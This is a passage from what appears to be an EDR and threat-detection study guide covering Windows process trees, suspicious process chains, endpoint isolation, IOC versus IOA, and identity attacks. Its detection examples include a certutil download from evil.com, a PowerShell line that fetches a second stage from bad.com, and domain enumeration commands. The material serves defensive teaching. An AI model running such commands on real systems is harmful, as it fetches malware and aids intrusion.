â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                         â”‚
â”‚                                                                             â”‚
â”‚  System (PID 4)                                                             â”‚
â”‚  â””â”€â”€ smss.exe (Session Manager)                                             â”‚
â”‚      â””â”€â”€ csrss.exe (Client Server Runtime)                                  â”‚
â”‚      â””â”€â”€ wininit.exe (Session 0)                                           â”‚
â”‚          â””â”€â”€ services.exe                                                   â”‚
â”‚              â””â”€â”€ svchost.exe (multiple instances)                           â”‚
â”‚              â””â”€â”€ spoolsv.exe                                                â”‚
â”‚              â””â”€â”€ MsMpEng.exe (Defender)                                     â”‚
â”‚          â””â”€â”€ lsass.exe (Local Security Authority)                           â”‚
â”‚      â””â”€â”€ csrss.exe (Session 1)                                              â”‚
â”‚      â””â”€â”€ winlogon.exe                                                       â”‚
â”‚          â””â”€â”€ dwm.exe (Desktop Window Manager)                               â”‚
â”‚          â””â”€â”€ userinit.exe                                                   â”‚
â”‚              â””â”€â”€ explorer.exe                                               â”‚
â”‚                  â””â”€â”€ [User Applications]                                    â”‚
â”‚                                                                             â”‚
â”‚  KEY RELATIONSHIPS TO KNOW:                                                 â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                â”‚
â”‚  â€¢ explorer.exe â†’ User-launched applications                               â”‚
â”‚  â€¢ services.exe â†’ Windows services                                          â”‚
â”‚  â€¢ svchost.exe â†’ Service host (check -k parameter)                         â”‚
â”‚  â€¢ lsass.exe â†’ ALWAYS child of wininit.exe, ONE instance only             â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Suspicious vs Normal Process Trees
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                NORMAL vs SUSPICIOUS PROCESS RELATIONSHIPS                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  âœ… NORMAL: Browser downloading and running installer                      â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                      â”‚
â”‚  explorer.exe                                                               â”‚
â”‚  â””â”€â”€ chrome.exe                                                             â”‚
â”‚      â””â”€â”€ chrome.exe (renderer processes - normal)                          â”‚
â”‚                                                                             â”‚
â”‚  explorer.exe                                                               â”‚
â”‚  â””â”€â”€ installer.exe (user double-clicked downloaded file)                   â”‚
â”‚                                                                             â”‚
â”‚                                                                             â”‚
â”‚  âŒ SUSPICIOUS: Office spawning command interpreters                        â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                       â”‚
â”‚  explorer.exe                                                               â”‚
â”‚  â””â”€â”€ WINWORD.EXE                                                            â”‚
â”‚      â””â”€â”€ cmd.exe                    â† RED FLAG: Why would Word need cmd?   â”‚
â”‚          â””â”€â”€ powershell.exe         â† RED FLAG: Escalation to PowerShell   â”‚
â”‚              â””â”€â”€ whoami.exe         â† RED FLAG: Reconnaissance             â”‚
â”‚                                                                             â”‚
â”‚                                                                             â”‚
â”‚  âŒ SUSPICIOUS: Script interpreters with encoded commands                   â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                   â”‚
â”‚  wscript.exe                                                                â”‚
â”‚  â””â”€â”€ powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0A...                       â”‚
â”‚      â”‚                      â†‘                                               â”‚
â”‚      â”‚              Base64 encoded = trying to hide                         â”‚
â”‚      â””â”€â”€ net.exe user /domain                                               â”‚
â”‚          â”‚           â†‘                                                      â”‚
â”‚          â”‚    Domain enumeration                                            â”‚
â”‚                                                                             â”‚
â”‚                                                                             â”‚
â”‚  âŒ SUSPICIOUS: Service spawning unusual children                           â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                       â”‚
â”‚  services.exe                                                               â”‚
â”‚  â””â”€â”€ svchost.exe -k netsvcs                                                 â”‚
â”‚      â””â”€â”€ cmd.exe                    â† Services shouldn't spawn cmd         â”‚
â”‚          â””â”€â”€ certutil.exe -urlcache -f http://evil.com/mal.exe             â”‚
â”‚                           â†‘                                                 â”‚
â”‚                    LOLBin for download                                      â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

####  Process Tree Example:
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           EXAMPLE 1: EMOTET/TRICKBOT INFECTION CHAIN                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  Process Tree:                                                              â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                              â”‚
â”‚                                                                             â”‚
â”‚  OUTLOOK.EXE (1234)                                                         â”‚
â”‚  â”‚   User: CORP\jsmith                                                      â”‚
â”‚  â”‚   Time: 09:15:32                                                         â”‚
â”‚  â”‚                                                                          â”‚
â”‚  â””â”€â”€ WINWORD.EXE (2345)                                                     â”‚
â”‚      â”‚   Path: C:\Program Files\Microsoft Office\...\WINWORD.EXE           â”‚
â”‚      â”‚   User: CORP\jsmith                                                  â”‚
â”‚      â”‚   Time: 09:15:45                                                     â”‚
â”‚      â”‚   File Opened: Invoice_12345.docm  â† Macro-enabled!                â”‚
â”‚      â”‚                                                                      â”‚
â”‚      â””â”€â”€ cmd.exe (3456)                   â† ğŸš¨ SUSPICIOUS                  â”‚
â”‚          â”‚   CommandLine: cmd.exe /c powershell -w hidden -enc JABzA...    â”‚
â”‚          â”‚   Time: 09:16:02                                                â”‚
â”‚          â”‚                                                                  â”‚
â”‚          â””â”€â”€ powershell.exe (4567)        â† ğŸš¨ MALICIOUS                   â”‚
â”‚              â”‚   CommandLine: powershell -w hidden -enc JABzAHQAYQBnAG...  â”‚
â”‚              â”‚   Decoded: $stage2 = (New-Object Net.WebClient)             â”‚
â”‚              â”‚            .DownloadString('http://bad.com/stage2.ps1')     â”‚
â”‚              â”‚   Time: 09:16:03                                            â”‚
â”‚              â”‚   Network: 45.33.32.156:80 (bad.com)                        â”‚
â”‚              â”‚                                                              â”‚
â”‚              â””â”€â”€ rundll32.exe (5678)      â† ğŸš¨ PAYLOAD EXECUTION           â”‚
â”‚                  â”‚   CommandLine: rundll32.exe C:\Users\jsmith\AppData\   â”‚
â”‚                  â”‚                Local\Temp\payload.dll,DllMain           â”‚
â”‚                  â”‚   Time: 09:16:10                                        â”‚
â”‚                  â”‚                                                          â”‚
â”‚                  â””â”€â”€ [Persistence & Lateral Movement...]                   â”‚
â”‚                                                                             â”‚
â”‚  Analysis Summary:                                                          â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                          â”‚
â”‚  â€¢ User opened malicious email attachment                                  â”‚
â”‚  â€¢ Macro executed, spawned hidden PowerShell                               â”‚
â”‚  â€¢ Downloaded second stage from C2                                         â”‚
â”‚  â€¢ DLL payload executed via rundll32                                       â”‚
â”‚  â€¢ MITRE: T1204.002 â†’ T1059.001 â†’ T1105 â†’ T1218.011                       â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


---

#  Endpoint Isolation & Containment

## Isolation Capabilities

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     ENDPOINT ISOLATION METHODS                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                    NETWORK ISOLATION                                 â”‚   â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  BEFORE ISOLATION:                                                   â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚   â”‚
â”‚  â”‚  â”‚Workstationâ”‚â”€â”€â”€â”€â”‚Corporate â”‚â”€â”€â”€â”€â”‚ Internet â”‚                      â”‚   â”‚
â”‚  â”‚  â”‚          â”‚     â”‚ Network  â”‚     â”‚          â”‚                      â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚   â”‚
â”‚  â”‚       â”‚                 â”‚                                            â”‚   â”‚
â”‚  â”‚       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                                            â”‚   â”‚
â”‚  â”‚       â”‚  All traffic    â”‚                                            â”‚   â”‚
â”‚  â”‚       â”‚  allowed        â”‚                                            â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  AFTER ISOLATION:                                                    â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚   â”‚
â”‚  â”‚  â”‚Workstationâ”‚â”€â”€Xâ”€â”€â”‚Corporate â”‚â”€â”€Xâ”€â”€â”‚ Internet â”‚                    â”‚   â”‚
â”‚  â”‚  â”‚(ISOLATED)â”‚     â”‚ Network  â”‚     â”‚          â”‚                      â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚   â”‚
â”‚  â”‚       â”‚                                                              â”‚   â”‚
â”‚  â”‚       â”‚  ONLY EDR traffic allowed                                   â”‚   â”‚
â”‚  â”‚       â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                   â”‚   â”‚
â”‚  â”‚       â””â”€â”€â”‚   EDR Cloud Console  â”‚                                   â”‚   â”‚
â”‚  â”‚          â”‚   (Investigation &   â”‚                                   â”‚   â”‚
â”‚  â”‚          â”‚    Response)         â”‚                                   â”‚   â”‚
â”‚  â”‚          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                   â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### When to Isolate an Endpoint:
âœ… Isolate if:

- Active C2 communication detected
- Ransomware encryption in progress
- Lateral movement from this host
- Insider threat containment

âŒ Do NOT isolate if:

- False positive (benign admin tool)
- Production server (isolate after business approval)
- Already disconnected host

## Isolation Methods
#### 1. Network Isolation (Most Common)
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Infected Host   â”‚
â”‚   (IP: 10.1.1.50)â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚ â›” BLOCKED
    â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”
    â”‚ Firewall â”‚ â† EDR pushes ACL rule
    â”‚   Rule   â”‚   DENY 10.1.1.50 ANY
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         âœ… ALLOWED (EDR agent only)
    â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”
    â”‚ EDR Cloudâ”‚ â† Still phones home for commands
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


#### 2. OS-Level Containment

**Windows:** Disable network adapter
```powershell
Disable-NetAdapter -Name "Ethernet" -Confirm:$false
```

**Linux:** Drop all traffic (except EDR)
```bash
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -A OUTPUT -d <EDR_IP> -j ACCEPT  # Allow EDR comms
```

#### 3. VLAN Quarantine

Move infected host to isolated VLAN with no Internet/LAN access:
```
Normal VLAN (10.1.1.0/24) â†’ Quarantine VLAN (192.168.99.0/24)
```


---
#  IOC vs IOA (Indicators of Compromise vs. Attack)

## IOC (Indicators of Compromise)
Evidence that a breach has already occurred

#### Example:

| Type             | Example                                                      | Detection Method        |
| :--------------- | :----------------------------------------------------------- | :---------------------- |
| **File Hash**    | `44d88612fea8a8f36de82e1278abb02f` (WannaCry)                | AV/EDR signature match  |
| **IP Address**   | `185.220.101.1` (Known C2 server)                            | Firewall logs, SIEM     |
| **Domain**       | `evil-phishing.com`                                          | DNS logs                |
| **Mutex**        | `\BaseNamedObjects\MutexCantRepeat` (Emotet)                 | Process memory analysis |
| **Registry Key** | `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Malware` | Registry monitoring     |

**Limitation:** IOCs are reactive (attackers can change hashes/IPs easily)


## IOA (Indicators of Attack)
Behavioral patterns of an ongoing attack (TTP-based)

#### Example:

| TTP (MITRE ATT&CK)                | Behavior                                        | EDR Detection            |
| :-------------------------------- | :---------------------------------------------- | :----------------------- |
| **T1059.001** (PowerShell)        | `powershell.exe -enc <base64>`                  | Command-line monitoring  |
| **T1055** (Process Injection)     | `CreateRemoteThread()` into `explorer.exe`      | API hooking              |
| **T1003** (Credential Dumping)    | `lsass.exe` memory access by non-system process | Memory access monitoring |
| **T1547.001** (Registry Run Keys) | New autorun entry in `HKCU\...\Run`             | Registry change events   |

**Advantage:** IOAs detect unknown malware using the same TTPs

| Aspect | IOC | IOA |
| :--- | :--- | :--- |
| **Focus** | Artifacts (files, IPs) | Behaviors (actions) |
| **Detection** | Signature-based | Behavioral analytics |
| **Evasion** | Easy (change hash) | Hard (must change TTP) |
| **Example** | Hash of `mimikatz.exe` | LSASS memory dumping behavior |
| **MITRE Mapping** | N/A | Directly maps to ATT&CK TTPs |



---

# ITDR (Identity Threat Detection & Response)

ITDR = EDR for Identity Systems (Active Directory, Entra ID, Okta)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    IDENTITY THREAT LANDSCAPE                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  "Identity is the New Perimeter"                                           â”‚
â”‚                                                                             â”‚
â”‚  Modern Attack Flow:                                                        â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚   â”‚
â”‚  â”‚   â”‚  Phishing â”‚â”€â”€â”€â–¶â”‚ Credential â”‚â”€â”€â”€â–¶â”‚ Valid Loginâ”‚â”€â”€â”€â–¶â”‚ Access  â”‚ â”‚   â”‚
â”‚  â”‚   â”‚   Email   â”‚    â”‚  Harvested â”‚    â”‚ (looks     â”‚    â”‚ Data    â”‚ â”‚   â”‚
â”‚  â”‚   â”‚           â”‚    â”‚            â”‚    â”‚  legitimate)â”‚   â”‚ Move    â”‚ â”‚   â”‚
â”‚  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚ Laterallyâ”‚ â”‚   â”‚
â”‚  â”‚                                                        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚   Traditional Endpoint Detection: Often misses this!                â”‚   â”‚
â”‚  â”‚   â€¢ No malware executed                                              â”‚   â”‚
â”‚  â”‚   â€¢ User is "real"                                                   â”‚   â”‚
â”‚  â”‚   â€¢ Access appears legitimate                                        â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  KEY IDENTITY ATTACK VECTORS:                                              â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ Attack Type          â”‚ Description                â”‚ MITRE ID       â”‚   â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚
â”‚  â”‚ Credential Stuffing  â”‚ Using leaked creds to      â”‚ T1110.004     â”‚   â”‚
â”‚  â”‚                      â”‚ access accounts            â”‚               â”‚   â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚
â”‚  â”‚ Password Spraying    â”‚ Common passwords across    â”‚ T1110.003     â”‚   â”‚
â”‚  â”‚                      â”‚ many accounts              â”‚               â”‚   â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚
â”‚  â”‚ Phishing/Vishing     â”‚ Social engineering for     â”‚ T1566         â”‚   â”‚
â”‚  â”‚                      â”‚ credentials                â”‚               â”‚   â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚
â”‚  â”‚ MFA Bypass           â”‚ Circumventing second       â”‚ T1111         â”‚   â”‚
â”‚  â”‚                      â”‚ factor                     â”‚               â”‚   â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚
â”‚  â”‚ Session Hijacking    â”‚ Stealing tokens/cookies    â”‚ T1550.001     â”‚   â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚
â”‚  â”‚ Golden Ticket        â”‚ Forged Kerberos tickets    â”‚ T1558.001     â”‚   â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚
â”‚  â”‚ DCSync               â”‚ Replicating AD credentials â”‚ T1003.006     â”‚   â”‚
